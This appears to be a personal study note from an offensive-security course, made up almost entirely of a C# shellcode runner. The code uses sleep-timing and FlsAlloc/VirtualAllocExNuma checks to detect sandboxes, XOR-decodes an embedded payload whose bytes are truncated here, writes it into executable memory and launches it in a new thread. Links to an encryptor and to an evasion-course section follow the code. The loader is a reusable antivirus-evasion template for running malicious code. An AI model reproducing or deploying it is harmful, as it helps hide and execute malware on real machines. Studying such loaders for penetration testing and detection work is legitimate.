```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Inject_XOR_w_Sleep_AltLibs
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll")] 
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            //Process[] localByName = Process.GetProcessesByName("explorer");
            //int i = localByName.Length;
            //IntPtr localByName = GetCurrentProcess();
            IntPtr hProcess = GetCurrentProcess();
            IntPtr addr = VirtualAllocExNuma(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
            if (addr == null)
            {
                Console.WriteLine("addr is null");
                return;
            }
            IntPtr tst = FlsAlloc(IntPtr.Zero);
            Console.WriteLine(tst);
            if(tst == (IntPtr)0xFFFFFFFF) 
            {
                Console.WriteLine("FlsAlloc " + FlsAlloc(tst));
                return;
            }
            byte[] buf = new byte[749] {0x06, 0xb2, 0x79, ...};

            //// Decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            //IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.ReadLine();
        }
    }
}

```

>Encryptor:
![[CS_ShellcodeEncryptor_XOR]]

More Info:
![[Evasion Techniques and Breaching Defenses#6 5 2 Encrypting the C Shellcode Runner]]